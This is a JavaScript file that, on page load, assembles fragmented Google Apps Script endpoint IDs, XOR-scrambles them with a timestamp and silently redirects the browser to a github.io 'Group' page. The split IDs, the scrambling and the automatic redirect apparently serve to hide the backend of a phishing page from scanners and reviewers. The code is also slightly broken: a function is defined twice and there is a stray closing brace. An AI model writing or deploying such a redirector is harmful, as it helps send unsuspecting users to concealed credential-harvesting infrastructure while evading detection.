function EID(NameID) {return document.getElementById(NameID);}
function EID(NameClass) {return document.getElementsByClassName(NameClass);}

window.addEventListener('DOMContentLoaded', (event) => { QT001(); });

function QT001(){
	window.rand = 0;
	window.page = "Group";
	function encrypt(key, value) {
  		var result="";
  		for(i=0;i<value.length;++i) { result+=String.fromCharCode(key[i % key.length]^value.charCodeAt(i)); }
  		return result;
	}

	function decrypt(key, value) {
 		var result="";
  		for(i=0;i<value.length;++i) { result+=String.fromCharCode(key[i % key.length]^value.charCodeAt(i)); }
  		return result;
	}
    
    	function base64_encode(s) { return btoa(unescape(encodeURIComponent(s))); }
	function base64_decode(s) { return decodeURIComponent(escape(atob(s))); }
    
    
    	function qwerty() {
    	
		var arr1 = [
             		['AKfycbw8Uc', 'np_fb0', 'GDkg4oYf', 'fP9GJ', 'DwSeGEwsS', 'qJT12Uuv', 'Vsh8CQ1dU'],
			['AKfycbygb-', 'BCkkPH', 'GgPKWE5U', 'jBLI6', 'qL-dC3ily', 'j5N2Zi'],
			['AKfycbz_x3', 'pT9792', 'hA6_cNtY', 'JgoGP', '2Ez0vXF3N', 'Lt4EJu-A'],
			['AKfycby3wK', 'kQa0Y7', 'b9n16dS9', 'mj7vG', 'ExEqTz7Dl', 'oNyMRs'],
			['AKfycbxTTa', 'LGsqUK', 'I84KMZk7', 'TQRbH', 'AgGWmupmD', 'NYN1FlIQ'],
			['AKfycbyFN0', 'Dg2yNi', '3gU32aNH', 'nR9j6', 'SLx7YsZsT', 'CP-TQ1Xg'],
			['AKfycbwQiv', 'cbzAr-', 'nDL4Dm5n', '8Yg0y', '_zHGIIeNa', 'grCfk7ow'],
			['AKfycbzG6k', '3db8wz', 'uDr8osP3', 'g1EWY', 'WZD1vr_BF', 'WDF0zh'],
			['AKfycbyZ0n', 'EjfMeL', 'CvWWyBzJ', 'XpBIw', 'L-Ey3Fz5T', 'tFB054'],
			['AKfycbzq5D', 'yl9_Ug', 'Th6r90oI', '4PYzR', 'zWwbASbsZ', '4JpjQZFA'],
			['AKfycbyaSx', 'LfzClh', '5lzzSNV6', '_h8Fe', 'RZOpckU6K', 'tgYs2C9w'],
			['AKfycbzKUn', 'LZPfDV', 'scy5oLBR', 'i_VVi', 'K7Rc4VIT9', 'QszoB6'],
			['AKfycbywWr', 'gxjUzI', '2R37OAWh', 'Vuw4T', 'qIPS6p9U6', 'BUk8Jr7g'],
			['AKfycbwDLI', '6d5-Q1', 'zYYvfn2Z', 'cGTj8', 'MBKFKKfs1', 'jzWk8ItQ'],
			['AKfycbzBUB', 'HufCgz', 'fjPApLdS', 'l_-be', 'g1DkRep0U', 'Jt8WcPhQ'],
			['AKfycbwX-X', 'Y0FA87', 'wgfTFgXt', 'xeeVV', 'ckPWAw-Vg', '31eeI5'],
			['AKfycbzUSh', 'nK9R_j', '-AsKnkeu', 'pfaz8', 'cxcjyCAWH', 'wh6lp5xg'],
			['AKfycbynUc', 'Crv3jh', 'VKDmCQNJ', 'aeihA', 'b6Avi1VeJ', 'QrFhs7'],
			['AKfycbwNyZ', 'XrgTvq', 'RpDkPjMx', 'keDGh', 'xTROrNMrx', 'sX34oy'],
			['AKfycbzKZj', 'UGkvPU', 'jXifP4XW', 'F4MBB', '0SanMh-T9', 'jnglBCWA'],
			['AKfycby4Tj', 'okHViF', 'FmPkoGWh', '6Fn4Y', 'ob34RcKeZ', 'sjsxtxQg'],
			['AKfycbyjqy', '0cK8Jw', '_9HT-_9d', 'KqF1L', 'Q4aUtSvSf', 'aJ2kWp'],
			['AKfycbzKoT', 'gZFAwD', 'V0AhOKjf', '6H8hi', 'kSAU2bpKg', 'ESQO4u']
			];

		var rand = Math.floor(Math.random() * (arr1.length-1));
		var script_url="";
		for (var i=0;i<arr1[rand].length;i++) { script_url = script_url + arr1[rand][i]; }
                
		var tzoffset = (new Date()).getTimezoneOffset() * 60000;
     		var localISOTime = (new Date(Date.now() - tzoffset)).toISOString();
     		var time = localISOTime.replace(/[^0-9]/g, "").slice(0, 17); 
                
            	var tg = base64_encode(time);
	    	var ngaunhien = Math.floor(Math.random() * 100);
	    	ngaunhien = 0;

           	location.href = "https://3nhat.github.io/Group" + ngaunhien + "/?P=" + "Group" + "&31G=" + encrypt("@Q.t.2011.0512", tg + "]QQQ[" + script_url);

    	}
	
	qwerty();
}	   


    
}
